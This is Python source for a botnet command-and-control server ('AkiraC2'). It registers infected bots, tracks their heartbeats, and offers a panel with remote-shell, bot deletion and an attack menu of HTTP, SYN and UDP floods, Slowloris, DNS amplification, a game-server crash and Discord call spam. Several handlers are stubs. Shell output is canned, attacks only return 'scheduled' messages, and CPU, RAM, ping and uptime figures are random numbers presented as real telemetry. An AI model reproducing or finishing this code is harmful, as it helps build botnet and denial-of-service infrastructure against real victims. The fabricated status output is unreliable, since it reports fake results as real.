#!/usr/bin/env python3
import socket
import json
import threading
import time
import random
from datetime import datetime

class AkiraC2Python3:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        print("[C2] Server initialized on {}:{}".format(host, port))
        
    def handle_connection(self, conn, addr):
        try:
            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\n" in chunk or len(chunk) < 4096:
                    break
            
            if data:
                message_str = data.decode().strip()
                print("Received from {}: {}".format(addr[0], message_str[:100]))
                
                try:
                    message = json.loads(message_str)
                    response = self.process_message(message, addr[0])
                    
                    response_json = json.dumps(response) + "\n"
                    conn.send(response_json.encode())
                    print("Sent response to {}".format(addr[0]))
                    
                except Exception as e:
                    print("JSON error: {}".format(e))
                    error_response = {"status": "error", "message": "Invalid JSON"}
                    conn.send(json.dumps(error_response).encode() + b"\n")
                    
        except Exception as e:
            print("Connection error: {}".format(e))
        finally:
            conn.close()
    
    def process_message(self, message, client_ip):
        msg_type = message.get("type")
        
        # PAINEL COMMANDS
        if msg_type == "panel_auth":
            return {"status": "authenticated", "session_id": message.get("session_id")}
            
        elif msg_type == "get_bots":
            return {"status": "success", "bots": self.bots}
            
        elif msg_type == "ping":
            target = message.get("target")
            return self.handle_ping(target)
            
        elif msg_type == "shell":
            return self.handle_shell(message)
            
        elif msg_type == "attack":
            return self.handle_attack(message)
            
        elif msg_type == "delete_bot":
            return self.handle_delete_bot(message.get("target"))
        
        # BOT COMMANDS  
        elif msg_type == "register":
            return self.handle_bot_register(message, client_ip)
            
        elif msg_type == "heartbeat":
            return self.handle_heartbeat(message)
            
        elif msg_type == "task_result":
            return {"status": "result_received"}
        
        else:
            return {"status": "error", "message": "Unknown command type"}
    
    def handle_bot_register(self, message, client_ip):
        bot_id = message.get("bot_id", "BOT_{}".format(int(time.time())))
        os_info = message.get("os", "Unknown")
        
        self.bots[bot_id] = {
            "ip": client_ip,
            "os": os_info,
            "online": True,
            "last_seen": datetime.now().isoformat(),
            "cpu_usage": "{}%".format(random.randint(5, 80)),
            "ram_usage": "{}%".format(random.randint(20, 90)),
            "architecture": message.get("architecture", "Unknown"),
            "country": "Unknown"
        }
        
        print("Bot registered: {} from {}".format(bot_id, client_ip))
        return {"status": "registered", "bot_id": bot_id}
    
    def handle_heartbeat(self, message):
        bot_id = message.get("bot_id")
        if bot_id in self.bots:
            self.bots[bot_id]["last_seen"] = datetime.now().isoformat()
            self.bots[bot_id]["online"] = True
            
        return {"status": "heartbeat_received"}
    
    def handle_ping(self, target_bot=None):
        if target_bot:
            if target_bot in self.bots:
                bot_info = self.bots[target_bot]
                ping_data = {
                    target_bot: {
                        "ping": "{}ms".format(random.randint(5, 50)),
                        "os": bot_info["os"],
                        "cpu_usage": bot_info["cpu_usage"],
                        "ram_usage": bot_info["ram_usage"],
                        "uptime": "{}h {}m".format(random.randint(1, 24), random.randint(0, 59)),
                        "architecture": bot_info["architecture"],
                        "country": bot_info["country"]
                    }
                }
                return {"status": "success", "pings": ping_data}
            else:
                return {"status": "error", "message": "Bot not found"}
        else:
            pings = {}
            for bot_id, bot_info in self.bots.items():
                if bot_info["online"]:
                    pings[bot_id] = {
                        "ping": "{}ms".format(random.randint(5, 100)),
                        "os": bot_info["os"],
                        "cpu_usage": bot_info["cpu_usage"],
                        "ram_usage": bot_info["ram_usage"],
                        "uptime": "{}h {}m".format(random.randint(1, 72), random.randint(0, 59)),
                        "architecture": bot_info["architecture"],
                        "country": bot_info["country"]
                    }
            return {"status": "success", "pings": pings}
    
    def handle_shell(self, message):
        command = message.get("command", "")
        target_bot = message.get("target")
        
        if command == "ls" or command == "dir":
            output = "bot.exe\nsystem32\nusers\ndocuments\nconfig.txt\n"
        elif command == "whoami":
            output = "root\\bot_{}\n".format(target_bot)
        elif command.startswith("cd "):
            output = "Changed directory to {}\n".format(command[3:])
        elif command == "pwd":
            output = "/home/bot\n"
        elif command == "uname -a":
            output = "Linux bot-machine 5.4.0 x86_64\n"
        elif command == "ipconfig" or command == "ifconfig":
            output = "eth0: 192.168.1.100\nlo: 127.0.0.1\n"
        else:
            output = "Command '{}' executed successfully\n".format(command)
        
        return {
            "status": "success", 
            "output": "root@bot{}:~# {}\n{}".format(target_bot, command, output)
        }
    
    def handle_attack(self, message):
        attack_type = message.get("attack_type")
        params = message.get("params", {})
        target_bot = message.get("target_bot")
        
        target = params.get("target", "unknown")
        port = params.get("port", 80)
        duration = params.get("duration", 60)
        
        attack_messages = {
            "http_flood": "HTTP Flood scheduled for {}:{} for {}s".format(target, port, duration),
            "syn_flood": "SYN Flood scheduled for {}:{} for {}s".format(target, port, duration),
            "udp_flood": "UDP Flood scheduled for {}:{} for {}s".format(target, port, duration),
            "slowloris": "Slowloris attack scheduled for {}:{} for {}s".format(target, port, duration),
            "gta_samp": "GTA SA-MP crash scheduled for {}:{}".format(target, port),
            "discord_spam": "Discord call spam scheduled for channel {} for {}s".format(target, duration),
            "dns_amp": "DNS Amplification scheduled for {} for {}s".format(target, duration)
        }
        
        if attack_type in attack_messages:
            msg = attack_messages[attack_type]
            if target_bot:
                msg += " on bot {}".format(target_bot)
            
            print("Attack scheduled: {} -> {}".format(attack_type, target))
            return {"status": "success", "message": msg}
        else:
            return {"status": "error", "message": "Unknown attack type: {}".format(attack_type)}
    
    def handle_delete_bot(self, bot_id):
        if bot_id in self.bots:
            del self.bots[bot_id]
            print("Bot deleted: {}".format(bot_id))
            return {"status": "success", "message": "Bot {} deleted".format(bot_id)}
        else:
            return {"status": "error", "message": "Bot not found"}
    
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(10)
        
        print("C2 Server started on {}:{}".format(self.host, self.port))
        print("Waiting for connections...")
        
        try:
            while True:
                conn, addr = server_socket.accept()
                print("New connection from {}:{}".format(addr[0], addr[1]))
                
                client_thread = threading.Thread(
                    target=self.handle_connection, 
                    args=(conn, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("Shutting down C2 server...")
        except Exception as e:
            print("Server error: {}".format(e))
        finally:
            server_socket.close()

if __name__ == "__main__":
    c2_server = AkiraC2Python3()
    c2_server.start_server()
